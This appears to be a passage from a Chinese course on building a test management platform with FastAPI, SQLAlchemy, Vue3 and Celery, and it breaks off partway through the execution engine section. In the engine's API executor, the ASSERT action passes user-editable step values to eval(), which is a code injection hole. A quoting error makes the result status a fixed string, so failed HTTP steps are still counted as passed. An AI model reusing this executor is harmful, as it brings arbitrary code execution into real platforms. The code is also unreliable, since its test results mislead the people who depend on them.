    type = Column(String(20), default="api")  # api/ui/perf
    status = Column(String(20), default=StatusEnum.DRAFT)
    precondition = Column(Text, nullable=True)
    tags = Column(String(512), nullable=True)  # JSON数组
    created_by = Column(Integer, ForeignKey("users.id"))

    project = relationship("Project", back_populates="cases")
    module = relationship("Module", back_populates="cases")
    steps = relationship("TestStep", back_populates="case", cascade="all, delete-orphan",
                         order_by="TestStep.step_no")
```

**测试步骤模型（TestStep）**：

```python
class TestStep(Base):
    __tablename__ = "test_steps"

    id = Column(Integer, primary_key=True, autoincrement=True)
    case_id = Column(Integer, ForeignKey("test_cases.id"), nullable=False)
    step_no = Column(Integer, nullable=False)
    action = Column(String(64), nullable=False)  # GET/POST/CLICK/INPUT/ASSERT
    target = Column(String(512), nullable=True)  # URL/选择器/元素名
    value = Column(Text, nullable=True)           # 参数/输入值
    expected = Column(Text, nullable=True)        # 期望结果
    extract = Column(String(256), nullable=True)  # 提取变量名

    case = relationship("TestCase", back_populates="steps")
```

**测试计划模型（TestPlan）**：

```python
class TestPlan(Base, TimestampMixin):
    __tablename__ = "test_plans"

    id = Column(Integer, primary_key=True, autoincrement=True)
    project_id = Column(Integer, ForeignKey("projects.id"), nullable=False)
    name = Column(String(256), nullable=False)
    description = Column(Text, nullable=True)
    case_ids = Column(Text, nullable=True)  # JSON数组
    config = Column(Text, nullable=True)    # JSON执行配置
    cron_expression = Column(String(64), nullable=True)
    retry_count = Column(Integer, default=0)
    timeout = Column(Integer, default=3600)  # 秒

    project = relationship("Project", back_populates="plans")
    reports = relationship("TestReport", back_populates="plan", cascade="all, delete-orphan")
```

**测试报告模型（TestReport）**：

```python
class TestReport(Base, TimestampMixin):
    __tablename__ = "test_reports"

    id = Column(Integer, primary_key=True, autoincrement=True)
    plan_id = Column(Integer, ForeignKey("test_plans.id"), nullable=False)
    status = Column(String(20), default="running")  # running/passed/failed/error
    total = Column(Integer, default=0)
    passed = Column(Integer, default=0)
    failed = Column(Integer, default=0)
    error = Column(Integer, default=0)
    skipped = Column(Integer, default=0)
    duration = Column(Integer, default=0)  # 毫秒
    log = Column(Text, nullable=True)
    started_at = Column(DateTime, nullable=True)
    finished_at = Column(DateTime, nullable=True)
    triggered_by = Column(String(64), nullable=True)  # manual/schedule/ci

    plan = relationship("TestPlan", back_populates="reports")
    case_results = relationship("CaseResult", back_populates="report", cascade="all, delete-orphan")
```

### 数据库配置

```python
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker

DATABASE_URL = "mysql+aiomysql://user:pass@localhost:3306/test_platform"

engine = create_async_engine(
    DATABASE_URL,
    echo=False,
    pool_size=20,
    max_overflow=10,
    pool_recycle=3600,
    pool_pre_ping=True,
)

AsyncSessionLocal = async_sessionmaker(
    engine,
    class_=AsyncSession,
    expire_on_commit=False,
)
```

### 数据库索引策略

| 表名 | 索引字段 | 索引类型 | 原因 |
|------|----------|----------|------|
| projects | name | UNIQUE | 项目名唯一 |
| test_cases | project_id | INDEX | 按项目查询高频 |
| test_cases | module_id | INDEX | 按模块筛选 |
| test_steps | case_id | INDEX | 按用例查步骤 |
| test_plans | project_id | INDEX | 按项目查计划 |
| test_reports | plan_id | INDEX | 按计划查报告 |
| test_reports | status | INDEX | 按状态筛选 |
| test_reports | created_at | INDEX | 按时间范围查询 |

### 数据库设计检查清单

- [ ] 是否满足第三范式（3NF）？
- [ ] 是否对高频查询字段建立了索引？
- [ ] 是否使用了软删除（deleted_at）避免数据物理丢失？
- [ ] 是否使用了UUID或自增ID作为主键？
- [ ] 外键是否设置了级联删除/置空策略？
- [ ] 是否考虑了分页查询的性能优化？
- [ ] JSON字段是否确实必要（查询困难）？
- [ ] 是否预留了扩展字段？

> **小结**：数据库设计遵循"先ER建模、再建表、后索引优化"的原则。SQLAlchemy ORM提供了声明式的模型定义方式和强大的关系映射能力。通过TimestampMixin实现了公共字段复用，通过enum限制了状态值域，通过cascade策略保证了数据一致性。表设计兼顾了查询性能（索引）和数据完整性（外键约束）。
""",
    },
    {
        "title": "第3节：RESTful API开发（FastAPI/路由/中间件）",
        "sort_order": 3,
        "knowledge_point": "FastAPI RESTful 路由 中间件 依赖注入",
        "time_estimate": 35,
        "content": """## 第3节：RESTful API开发（FastAPI/路由/中间件）

### FastAPI应用初始化

```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.exceptions import RequestValidationError

app = FastAPI(
    title="测试管理平台",
    description="企业级测试管理平台API",
    version="1.0.0",
    docs_url="/api/docs",
    redoc_url="/api/redoc",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

### 路由设计（v1版本）

```python
from fastapi import APIRouter, Depends, Query
from typing import Optional

router = APIRouter(prefix="/api/v1")

@router.get("/projects", response_model=PaginatedResponse)
async def list_projects(
    page: int = Query(1, ge=1),
    page_size: int = Query(20, ge=1, le=100),
    keyword: Optional[str] = Query(None),
    status: Optional[str] = Query(None),
    db: AsyncSession = Depends(get_db),
    current_user = Depends(get_current_user),
):
    query = select(Project).where(Project.deleted_at.is_(None))
    if keyword:
        query = query.where(Project.name.contains(keyword))
    if status:
        query = query.where(Project.status == status)

    total_query = select(func.count()).select_from(query.subquery())
    total = (await db.execute(total_query)).scalar()

    items_query = query.offset((page - 1) * page_size).limit(page_size).order_by(Project.created_at.desc())
    items = (await db.execute(items_query)).scalars().all()

    return PaginatedResponse(
        data={"items": items},
        total=total,
        page=page,
        page_size=page_size,
    )

@router.post("/projects", response_model=ApiResponse, status_code=201)
async def create_project(
    project_in: ProjectCreate,
    db: AsyncSession = Depends(get_db),
    current_user = Depends(get_current_user),
):
    existing = await db.execute(
        select(Project).where(Project.name == project_in.name)
    )
    if existing.scalar():
        raise HTTPException(status_code=400, detail="项目名称已存在")

    project = Project(**project_in.model_dump(), owner_id=current_user.id)
    db.add(project)
    await db.commit()
    await db.refresh(project)
    return ApiResponse(data=project, message="创建成功")
```

### Pydantic Schema定义

```python
from pydantic import BaseModel, Field
from datetime import datetime
from typing import Optional, List

class ProjectCreate(BaseModel):
    name: str = Field(..., min_length=2, max_length=128)
    description: Optional[str] = None
    config: Optional[dict] = None

class ProjectUpdate(BaseModel):
    name: Optional[str] = Field(None, min_length=2, max_length=128)
    description: Optional[str] = None
    config: Optional[dict] = None
    status: Optional[str] = None

class ProjectOut(BaseModel):
    id: int
    name: str
    description: Optional[str]
    status: str
    owner_id: int
    created_at: datetime
    updated_at: datetime

    model_config = ConfigDict(from_attributes=True)

class TestCaseCreate(BaseModel):
    project_id: int
    module_id: Optional[int] = None
    name: str = Field(..., min_length=2, max_length=256)
    description: Optional[str] = None
    priority: str = "P2"
    type: str = "api"
    precondition: Optional[str] = None
    steps: List[StepCreate] = Field(default_factory=list)

class StepCreate(BaseModel):
    step_no: int
    action: str
    target: Optional[str] = None
    value: Optional[str] = None
    expected: Optional[str] = None
```

### 中间件实现

**请求日志中间件**：

```python
from starlette.middleware.base import BaseHTTPMiddleware
import time
import logging

logger = logging.getLogger(__name__)

class RequestLogMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        start_time = time.time()
        response = await call_next(request)
        duration = (time.time() - start_time) * 1000
        logger.info(
            f"{request.method} {request.url.path} "
            f"-> {response.status_code} "
            f"[{duration:.2f}ms]"
        )
        return response

app.add_middleware(RequestLogMiddleware)
```

**全局异常处理**：

```python
from fastapi.exceptions import RequestValidationError
from fastapi.responses import JSONResponse

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request, exc):
    errors = []
    for error in exc.errors():
        errors.append({
            "field": ".".join(str(loc) for loc in error["loc"]),
            "message": error["msg"],
        })
    return JSONResponse(
        status_code=422,
        content={"code": 422, "message": "参数校验失败", "data": {"errors": errors}},
    )

@app.exception_handler(HTTPException)
async def http_exception_handler(request, exc):
    return JSONResponse(
        status_code=exc.status_code,
        content={"code": exc.status_code, "message": exc.detail, "data": None},
    )
```

### 依赖注入

```python
from fastapi import Depends, Header

async def get_db() -> AsyncSession:
    async with AsyncSessionLocal() as session:
        try:
            yield session
            await session.commit()
        except Exception:
            await session.rollback()
            raise
        finally:
            await session.close()

async def get_current_user(
    authorization: str = Header(None),
    db: AsyncSession = Depends(get_db),
):
    if not authorization:
        raise HTTPException(status_code=401, detail="未提供认证令牌")
    token = authorization.replace("Bearer ", "")
    payload = decode_jwt_token(token)
    user = await db.get(User, payload.get("user_id"))
    if not user:
        raise HTTPException(status_code=401, detail="用户不存在")
    return user

class PermissionChecker:
    def __init__(self, required_permissions: List[str]):
        self.required_permissions = required_permissions

    async def __call__(self, current_user=Depends(get_current_user)):
        if not set(self.required_permissions).issubset(set(current_user.permissions)):
            raise HTTPException(status_code=403, detail="权限不足")
        return current_user
```

### API开发检查清单

- [ ] 是否遵循RESTful URL命名规范（名词复数）？
- [ ] 是否对所有Schema进行了Pydantic校验？
- [ ] 是否使用Depends实现了依赖注入（DB会话、认证）？
- [ ] 是否配置了CORS中间件？
- [ ] 是否实现了统一异常处理？
- [ ] 是否添加了请求日志中间件？
- [ ] 分页接口是否限制了最大page_size？
- [ ] 是否对敏感操作记录了操作日志？
- [ ] Swagger文档是否可正常访问？

> **小结**：FastAPI的路由系统通过APIRouter实现了模块化，Pydantic Schema提供了请求/响应的自动校验和文档生成，中间件机制支持了横切关注点（日志、CORS、认证）的优雅实现。依赖注入系统（Depends）实现了DB会话管理和权限校验的解耦。这套架构模式确保了API层的可维护性和可扩展性。
""",
    },
    {
        "title": "第4节：前端页面开发（Vue3+Element Plus）",
        "sort_order": 4,
        "knowledge_point": "Vue3 Element Plus 前端开发 Pinia",
        "time_estimate": 35,
        "content": """## 第4节：前端页面开发（Vue3+Element Plus）

### 前端项目初始化

```bash
npm create vite@latest frontend -- --template vue-ts
cd frontend
npm install element-plus @element-plus/icons-vue
npm install vue-router@4 pinia axios
npm install -D @types/node sass
```

### 全局配置

```typescript
import { createApp } from 'vue'
import ElementPlus from 'element-plus'
import 'element-plus/dist/index.css'
import zhCn from 'element-plus/dist/locale/zh-cn.mjs'
import * as ElementPlusIconsVue from '@element-plus/icons-vue'
import { createPinia } from 'pinia'
import router from './router'
import App from './App.vue'

const app = createApp(App)
app.use(ElementPlus, { locale: zhCn })
app.use(createPinia())
app.use(router)

for (const [key, component] of Object.entries(ElementPlusIconsVue)) {
  app.component(key, component)
}
app.mount('#app')
```

### 路由配置

```typescript
import { createRouter, createWebHistory } from 'vue-router'

const routes = [
  {
    path: '/',
    component: () => import('@/layouts/MainLayout.vue'),
    redirect: '/dashboard',
    children: [
      {
        path: 'dashboard',
        name: 'Dashboard',
        component: () => import('@/views/dashboard/Index.vue'),
        meta: { title: '工作台', icon: 'Odometer' }
      },
      {
        path: 'projects',
        name: 'Projects',
        component: () => import('@/views/projects/List.vue'),
        meta: { title: '项目管理', icon: 'Folder' }
      },
      {
        path: 'projects/:id/cases',
        name: 'TestCases',
        component: () => import('@/views/cases/List.vue'),
        meta: { title: '用例管理', icon: 'Document' }
      },
      {
        path: 'plans',
        name: 'TestPlans',
        component: () => import('@/views/plans/List.vue'),
        meta: { title: '测试计划', icon: 'Clock' }
      },
      {
        path: 'reports',
        name: 'Reports',
        component: () => import('@/views/reports/List.vue'),
        meta: { title: '测试报表', icon: 'DataAnalysis' }
      },
    ]
  },
  {
    path: '/login',
    name: 'Login',
    component: () => import('@/views/auth/Login.vue'),
    meta: { title: '登录' }
  }
]

const router = createRouter({
  history: createWebHistory(),
  routes
})

router.beforeEach((to, from, next) => {
  const token = localStorage.getItem('token')
  if (to.name !== 'Login' && !token) {
    next({ name: 'Login' })
  } else {
    next()
  }
})

export default router
```

### API封装（Axios）

```typescript
import axios, { AxiosRequestConfig, AxiosResponse } from 'axios'
import { ElMessage } from 'element-plus'

const http = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000/api/v1',
  timeout: 30000,
})

http.interceptors.request.use((config) => {
  const token = localStorage.getItem('token')
  if (token) {
    config.headers.Authorization = `Bearer ${token}`
  }
  return config
})

http.interceptors.response.use(
  (response: AxiosResponse) => {
    const { code, message, data } = response.data
    if (code !== 200) {
      ElMessage.error(message || '请求失败')
      return Promise.reject(new Error(message))
    }
    return data
  },
  (error) => {
    if (error.response?.status === 401) {
      localStorage.removeItem('token')
      window.location.href = '/login'
    }
    ElMessage.error(error.message || '网络错误')
    return Promise.reject(error)
  }
)

export default http
```

### 项目列表页面示例

```vue
<template>
  <div class="project-list">
    <el-card>
      <template #header>
        <div class="card-header">
          <span class="title">项目管理</span>
          <el-button type="primary" @click="handleCreate">
            <el-icon><Plus /></el-icon>
            新建项目
          </el-button>
        </div>
      </template>

      <div class="toolbar">
        <el-input v-model="keyword" placeholder="搜索项目名称" clearable
                  class="search-input" @clear="fetchData" @keyup.enter="fetchData">
          <template #prefix><el-icon><Search /></el-icon></template>
        </el-input>
        <el-select v-model="statusFilter" placeholder="状态筛选" clearable @change="fetchData">
          <el-option label="活跃" value="active" />
          <el-option label="归档" value="archived" />
        </el-select>
      </div>

      <el-table :data="projects" v-loading="loading" stripe>
        <el-table-column prop="id" label="ID" width="80" />
        <el-table-column prop="name" label="项目名称" min-width="200" />
        <el-table-column prop="description" label="描述" min-width="300" show-overflow-tooltip />
        <el-table-column prop="status" label="状态" width="100">
          <template #default="{ row }">
            <el-tag :type="row.status === 'active' ? 'success' : 'info'">
              {{ row.status === 'active' ? '活跃' : '归档' }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="created_at" label="创建时间" width="180" />
        <el-table-column label="操作" width="280" fixed="right">
          <template #default="{ row }">
            <el-button link type="primary" @click="handleEdit(row)">编辑</el-button>
            <el-button link type="primary" @click="$router.push(`/projects/${row.id}/cases`)">用例</el-button>
            <el-button link type="danger" @click="handleDelete(row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-pagination
        v-model:current-page="page"
        v-model:page-size="pageSize"
        :total="total"
        :page-sizes="[10, 20, 50, 100]"
        layout="total, sizes, prev, pager, next, jumper"
        @change="fetchData"
      />
    </el-card>

    <ProjectFormDialog v-model:visible="dialogVisible" :project="currentProject"
                       @success="fetchData" />
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import http from '@/api/http'

const projects = ref([])
const loading = ref(false)
const keyword = ref('')
const statusFilter = ref('')
const page = ref(1)
const pageSize = ref(20)
const total = ref(0)
const dialogVisible = ref(false)
const currentProject = ref(null)

const fetchData = async () => {
  loading.value = true
  try {
    const res = await http.get('/projects', {
      params: { page: page.value, page_size: pageSize.value, keyword: keyword.value, status: statusFilter.value }
    })
    projects.value = res.items
    total.value = res.total
  } finally {
    loading.value = false
  }
}

const handleCreate = () => {
  currentProject.value = null
  dialogVisible.value = true
}

const handleEdit = (row) => {
  currentProject.value = row
  dialogVisible.value = true
}

const handleDelete = async (row) => {
  await ElMessageBox.confirm(`确认删除项目 "${row.name}"？`, '提示', { type: 'warning' })
  await http.delete(`/projects/${row.id}`)
  ElMessage.success('删除成功')
  fetchData()
}

onMounted(fetchData)
</script>
```

### 状态管理（Pinia Store）

```typescript
import { defineStore } from 'pinia'
import http from '@/api/http'

export const useProjectStore = defineStore('project', {
  state: () => ({
    currentProject: null as any,
    projectList: [] as any[],
  }),
  actions: {
    async fetchProject(id: number) {
      const res = await http.get(`/projects/${id}`)
      this.currentProject = res
      return res
    },
    async setCurrentProject(project: any) {
      this.currentProject = project
    },
  },
})
```

### 前端开发检查清单

- [ ] 是否使用了TypeScript进行类型安全开发？
- [ ] 是否实现了路由懒加载优化首屏性能？
- [ ] Axios拦截器是否统一处理了认证和错误？
- [ ] 是否使用Element Plus实现了统一UI风格？
- [ ] 表单是否实现了前端校验（rule验证）？
- [ ] 列表页面是否实现了分页、搜索、筛选？
- [ ] 是否使用Pinia管理了跨组件状态？
- [ ] 是否处理了Token过期自动跳转登录？
- [ ] 敏感操作是否有二次确认？

> **小结**：Vue3+Element Plus+TypeScript的组合提供了类型安全的现代前端开发体验。通过路由懒加载、Axios拦截器、Pinia状态管理等最佳实践，可以构建出用户体验良好、代码可维护性高的SPA应用。Element Plus丰富的企业级组件（表格、表单、弹窗、标签等）大幅降低了UI开发成本。
""",
    },
    {
        "title": "第5节：用例管理模块设计与实现",
        "sort_order": 5,
        "knowledge_point": "用例管理 步骤编辑 Excel导入 CRUD",
        "time_estimate": 35,
        "content": """## 第5节：用例管理模块设计与实现

### 用例管理功能矩阵

```
┌─────────────────────────────────────────────────────┐
│                    用例管理模块                        │
├───────────────┬───────────────┬─────────────────────┤
│  基础CRUD      │   导入导出     │     批量操作         │
│ ┌───────────┐ │ ┌───────────┐ │ ┌─────────────────┐ │
│ │ 创建用例    │ │ │ Excel导入  │ │ │ 批量删除         │ │
│ │ 编辑用例    │ │ │ Excel导出  │ │ │ 批量修改优先级    │ │
│ │ 删除用例    │ │ │ YAML导入   │ │ │ 批量分配模块     │ │
│ │ 复制用例    │ │ │ JSON导入   │ │ │ 批量添加到计划    │ │
│ │ 移动用例    │ │ │ 模板下载   │ │ │ 批量执行         │ │
│ └───────────┘ │ └───────────┘ │ └─────────────────┘ │
├───────────────┼───────────────┼─────────────────────┤
│  步骤管理      │   分类组织     │     版本管理         │
│ ┌───────────┐ │ ┌───────────┐ │ ┌─────────────────┐ │
│ │ 添加步骤    │ │ 模块树      │ │ │ 用例版本历史      │ │
│ │ 编辑步骤    │ │ 标签分类    │ │ │ 版本回退         │ │
│ │ 拖拽排序    │ │ 优先级筛选  │ │ │ 变更对比         │ │
│ │ 步骤参数化  │ │ 全文搜索    │ │ │ 变更通知         │ │
│ │ 步骤模板    │ │ 自定义视图  │ │ │ 审批流程         │ │
│ └───────────┘ │ └───────────┘ │ └─────────────────┘ │
└───────────────┴───────────────┴─────────────────────┘
```

### 后端用例CRUD接口

```python
@router.get("/projects/{project_id}/cases")
async def list_cases(
    project_id: int,
    page: int = Query(1, ge=1),
    page_size: int = Query(20, ge=1, le=100),
    keyword: Optional[str] = Query(None),
    priority: Optional[str] = Query(None),
    module_id: Optional[int] = Query(None),
    db: AsyncSession = Depends(get_db),
):
    query = select(TestCase).options(
        selectinload(TestCase.steps),
        selectinload(TestCase.module)
    ).where(
        TestCase.project_id == project_id,
        TestCase.deleted_at.is_(None)
    )
    if keyword:
        query = query.where(TestCase.name.contains(keyword))
    if priority:
        query = query.where(TestCase.priority == priority)
    if module_id:
        query = query.where(TestCase.module_id == module_id)

    total = (await db.execute(select(func.count()).select_from(query.subquery()))).scalar()
    items = (await db.execute(
        query.order_by(TestCase.updated_at.desc())
        .offset((page - 1) * page_size).limit(page_size)
    )).scalars().all()

    return PaginatedResponse(data={"items": items}, total=total, page=page, page_size=page_size)
```

### 用例创建（含步骤事务）

```python
@router.post("/projects/{project_id}/cases", status_code=201)
async def create_case(
    project_id: int,
    case_in: TestCaseCreate,
    db: AsyncSession = Depends(get_db),
    current_user = Depends(get_current_user),
):
    project = await db.get(Project, project_id)
    if not project:
        raise HTTPException(status_code=404, detail="项目不存在")

    async with db.begin():
        case = TestCase(
            project_id=project_id,
            module_id=case_in.module_id,
            name=case_in.name,
            description=case_in.description,
            priority=case_in.priority,
            type=case_in.type,
            precondition=case_in.precondition,
            created_by=current_user.id,
        )
        db.add(case)
        await db.flush()

        for step_in in case_in.steps:
            step = TestStep(case_id=case.id, **step_in.model_dump())
            db.add(step)

    await db.refresh(case)
    return ApiResponse(data=case, message="用例创建成功")
```

### 用例复制（深拷贝含步骤）

```python
@router.post("/cases/{case_id}/copy")
async def copy_case(
    case_id: int,
    db: AsyncSession = Depends(get_db),
):
    original = await db.get(TestCase, case_id, options=[selectinload(TestCase.steps)])
    if not original:
        raise HTTPException(status_code=404, detail="用例不存在")

    new_case = TestCase(
        project_id=original.project_id,
        module_id=original.module_id,
        name=f"{original.name}(副本)",
        description=original.description,
        priority=original.priority,
        type=original.type,
        precondition=original.precondition,
    )
    db.add(new_case)
    await db.flush()

    for step in original.steps:
        new_step = TestStep(
            case_id=new_case.id,
            step_no=step.step_no,
            action=step.action,
            target=step.target,
            value=step.value,
            expected=step.expected,
        )
        db.add(new_step)

    await db.commit()
    await db.refresh(new_case)
    return ApiResponse(data=new_case, message="用例复制成功")
```

### Excel批量导入

```python
import openpyxl
from io import BytesIO

@router.post("/cases/import/excel")
async def import_cases_from_excel(
    project_id: int = Form(...),
    file: UploadFile = File(...),
    db: AsyncSession = Depends(get_db),
):
    if not file.filename.endswith(('.xlsx', '.xls')):
        raise HTTPException(400, detail="请上传Excel文件(.xlsx/.xls)")

    content = await file.read()
    wb = openpyxl.load_workbook(BytesIO(content))
    ws = wb.active

    success_count = 0
    error_rows = []

    for row_idx, row in enumerate(ws.iter_rows(min_row=2, values_only=True), start=2):
        try:
            name, module, priority, precondition, steps_text = row[0], row[1], row[2], row[3], row[4]
            if not name:
                continue

            case = TestCase(
                project_id=project_id,
                name=str(name),
                priority=priority or "P2",
                precondition=str(precondition) if precondition else None,
            )
            db.add(case)
            await db.flush()

            if steps_text:
                steps = parse_steps_text(str(steps_text))
                for i, step in enumerate(steps, 1):
                    db.add(TestStep(case_id=case.id, step_no=i, **step))

            success_count += 1
        except Exception as e:
            error_rows.append({"row": row_idx, "error": str(e)})

    await db.commit()
    return ApiResponse(
        data={"success_count": success_count, "error_rows": error_rows},
        message=f"导入完成，成功{success_count}条",
    )
```

### 前端用例步骤编辑器

```vue
<template>
  <div class="step-editor">
    <el-table :data="steps" row-key="step_no" stripe>
      <el-table-column label="序号" width="60">
        <template #default="{ $index }">{{ $index + 1 }}</template>
      </el-table-column>
      <el-table-column label="操作" width="140">
        <template #default="{ row }">
          <el-select v-model="row.action" size="small">
            <el-option label="GET请求" value="GET" />
            <el-option label="POST请求" value="POST" />
            <el-option label="点击元素" value="CLICK" />
            <el-option label="输入文本" value="INPUT" />
            <el-option label="断言" value="ASSERT" />
            <el-option label="等待" value="WAIT" />
            <el-option label="执行脚本" value="SCRIPT" />
          </el-select>
        </template>
      </el-table-column>
      <el-table-column label="目标" min-width="200">
        <template #default="{ row }">
          <el-input v-model="row.target" size="small" :placeholder="getTargetPlaceholder(row.action)" />
        </template>
      </el-table-column>
      <el-table-column label="值/参数" min-width="200">
        <template #default="{ row }">
          <el-input v-model="row.value" size="small" type="textarea" :rows="1"
                    placeholder='JSON格式参数，支持{{变量}}' />
        </template>
      </el-table-column>
      <el-table-column label="期望结果" min-width="150">
        <template #default="{ row }">
          <el-input v-model="row.expected" size="small" placeholder="期望返回值" />
        </template>
      </el-table-column>
      <el-table-column label="提取变量" width="120">
        <template #default="{ row }">
          <el-input v-model="row.extract" size="small" placeholder="变量名" />
        </template>
      </el-table-column>
      <el-table-column label="操作" width="100" fixed="right">
        <template #default="{ $index }">
          <el-button link type="danger" size="small" @click="removeStep($index)">删除</el-button>
        </template>
      </el-table-column>
    </el-table>
    <el-button type="primary" link @click="addStep" style="margin-top: 8px">
      <el-icon><Plus /></el-icon>添加步骤
    </el-button>
  </div>
</template>

<script setup lang="ts">
import { ref } from 'vue'

const props = defineProps<{ modelValue: any[] }>()
const emit = defineEmits(['update:modelValue'])
const steps = ref(props.modelValue || [])

const addStep = () => {
  steps.value.push({
    step_no: steps.value.length + 1,
    action: 'GET',
    target: '',
    value: '',
    expected: '',
    extract: '',
  })
  emit('update:modelValue', steps.value)
}

const removeStep = (index: number) => {
  steps.value.splice(index, 1)
  steps.value.forEach((s, i) => (s.step_no = i + 1))
  emit('update:modelValue', steps.value)
}
</script>
```

### 用例管理检查清单

- [ ] 是否实现了用例的完整CRUD操作？
- [ ] 是否支持用例复制（含步骤深拷贝）？
- [ ] 是否支持按模块树组织用例层级？
- [ ] 是否支持Excel批量导入/导出？
- [ ] 是否支持用例拖拽排序？
- [ ] 步骤编辑器是否支持变量提取？
- [ ] 是否有用例版本历史记录？
- [ ] 删除操作是否有二次确认和软删除？

> **小结**：用例管理是测试平台最核心的模块。通过数据库事务保证用例+步骤的原子性创建，通过深拷贝实现用例复用，通过Excel导入/导出打通与外部工具的协作。前端步骤编辑器采用动态表格+下拉选择的设计，兼顾了灵活性和易用性，变量提取机制为数据驱动测试奠定了基础。
""",
    },
    {
        "title": "第6节：测试执行引擎（任务队列/调度）",
        "sort_order": 6,
        "knowledge_point": "Celery 任务队列 执行引擎 WebSocket",
        "time_estimate": 40,
        "content": """## 第6节：测试执行引擎（任务队列/调度）

### 执行引擎架构

```
┌─────────────────────────────────────────────────────────┐
│                     测试执行引擎                          │
├─────────────────────────────────────────────────────────┤
│  ┌──────────┐   ┌──────────┐   ┌──────────────────────┐ │
│  │ API触发   │   │ 定时触发  │   │ CI/CD Webhook触发    │ │
│  │ (手动)    │   │ (Cron)   │   │ (Git Push/PR)       │ │
│  └────┬─────┘   └────┬─────┘   └──────────┬───────────┘ │
│       │              │                     │             │
│       └──────────────┼─────────────────────┘             │
│                      ▼                                   │
│            ┌─────────────────┐                           │
│            │   任务调度器      │                           │
│            │  (Celery Beat)   │                           │
│            └────────┬────────┘                           │
│                     ▼                                    │
│            ┌─────────────────┐                           │
│            │   Redis 消息队列  │                           │
│            └────────┬────────┘                           │
│                     ▼                                    │
│     ┌───────────────────────────────┐                    │
│     │         Celery Workers        │                    │
│     │  ┌─────────┐  ┌─────────┐   │                    │
│     │  │ Worker 1│  │ Worker 2│...│                    │
│     │  └─────────┘  └─────────┘   │                    │
│     └───────────────────────────────┘                    │
│                     │                                    │
│                     ▼                                    │
│     ┌───────────────────────────────┐                    │
│     │       测试执行单元             │                    │
│     │  ┌───────┐ ┌───────────────┐ │                    │
│     │  │API执行器│ │  UI执行器     │ │                    │
│     │  └───────┘ └───────────────┘ │                    │
│     └───────────────────────────────┘                    │
│                     │                                    │
│                     ▼                                    │
│     ┌───────────────────────────────┐                    │
│     │     结果收集 & 报告生成        │                    │
│     │  ┌──────────┐ ┌──────────┐   │                    │
│     │  │ DB存储    │ │ WebSocket│   │                    │
│     │  └──────────┘ └──────────┘   │                    │
│     └───────────────────────────────┘                    │
└─────────────────────────────────────────────────────────┘
```

### Celery配置

```python
from celery import Celery

celery_app = Celery(
    "test_platform",
    broker="redis://localhost:6379/0",
    backend="redis://localhost:6379/1",
)

celery_app.conf.update(
    task_serializer="json",
    result_serializer="json",
    accept_content=["json"],
    timezone="Asia/Shanghai",
    enable_utc=True,
    task_acks_late=True,
    worker_prefetch_multiplier=1,
    task_track_started=True,
    task_soft_time_limit=600,
    task_time_limit=900,
    result_expires=3600,
)

celery_app.autodiscover_tasks(["app.tasks"])
```

### API执行器

```python
import httpx
import asyncio
from typing import Dict, Any

class APIExecutor:
    def __init__(self, base_url: str = "", headers: Dict = None):
        self.base_url = base_url
        self.variables = {}
        self.headers = headers or {}

    def resolve_var(self, text: str) -> str:
        import re
        def replacer(match):
            key = match.group(1)
            return str(self.variables.get(key, match.group(0)))
        return re.sub(r"\{\{(\w+)\}\}", replacer, text or "")

    async def execute_step(self, step) -> Dict[str, Any]:
        action = step.action
        url = self.resolve_var(step.target)
        data = self.resolve_var(step.value)
        expected = self.resolve_var(step.expected)
        start = asyncio.get_event_loop().time()

        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                if action == "GET":
                    resp = await client.get(url, headers=self.headers)
                elif action == "POST":
                    import json
                    resp = await client.post(url, json=json.loads(data), headers=self.headers)
                elif action == "PUT":
                    import json
                    resp = await client.put(url, json=json.loads(data), headers=self.headers)
                elif action == "DELETE":
                    resp = await client.delete(url, headers=self.headers)
                elif action == "ASSERT":
                    assert eval(f"{data} {expected}"), f"断言失败: {data} {expected}"
                    return {"status": "passed", "action": action, "message": "断言通过"}
                else:
                    return {"status": "error", "action": action, "message": f"未知操作: {action}"}

                duration = (asyncio.get_event_loop().time() - start) * 1000

                if step.extract:
                    self.variables[step.extract] = resp.json()

                result = {
                    "status": "passed' if resp.status_code < 400 else 'failed",
                    "action": action,
                    "status_code": resp.status_code,
                    "response_body": str(resp.text)[:500],
                    "duration_ms": round(duration, 2),
                    "message": f"{action} {url} -> {resp.status_code}",
                }
                return result

        except Exception as e:
            duration = (asyncio.get_event_loop().time() - start) * 1000
            return {
                "status": "error",
                "action": action,
                "duration_ms": round(duration, 2),
                "message": str(e),
            }
```

### Celery执行任务

```python
from celery import shared_task
from app.models import TestPlan, TestReport, TestCase, CaseResult, TestStep
from sqlalchemy import select
from sqlalchemy.orm import selectinload

@shared_task(bind=True)
def execute_plan(self, plan_id: int, triggered_by: str = "manual"):
    import asyncio
    from app.core.database import AsyncSessionLocal

    async def _execute():
        async with AsyncSessionLocal() as db:
            plan = await db.get(TestPlan, plan_id, options=[
                selectinload(TestPlan.project)
            ])
            if not plan:
                return {"error": "计划不存在"}

            report = TestReport(
                plan_id=plan_id,
                status="running",
                triggered_by=triggered_by,
                started_at=datetime.utcnow(),
            )
            db.add(report)
            await db.commit()
            await db.refresh(report)

            import json
            case_ids = json.loads(plan.case_ids or "[]")
            cases = (await db.execute(
                select(TestCase).options(selectinload(TestCase.steps))
                .where(TestCase.id.in_(case_ids))
            )).scalars().all()

            total, passed, failed, error = 0, 0, 0, 0
            executor = APIExecutor()

            for case in cases:
                total += 1
                case_start = time.time()
                try:
                    step_results = []
                    case_passed = True
                    for step in case.steps:
                        result = await executor.execute_step(step)
                        step_results.append(result)
                        if result["status"] in ("failed", "error"):
                            case_passed = False
                            break

                    if case_passed:
                        passed += 1
                    else:
                        failed += 1

                    duration = int((time.time() - case_start) * 1000)
                    db.add(CaseResult(
                        report_id=report.id,
                        case_id=case.id,
                        status="passed" if case_passed else "failed",
                        duration=duration,
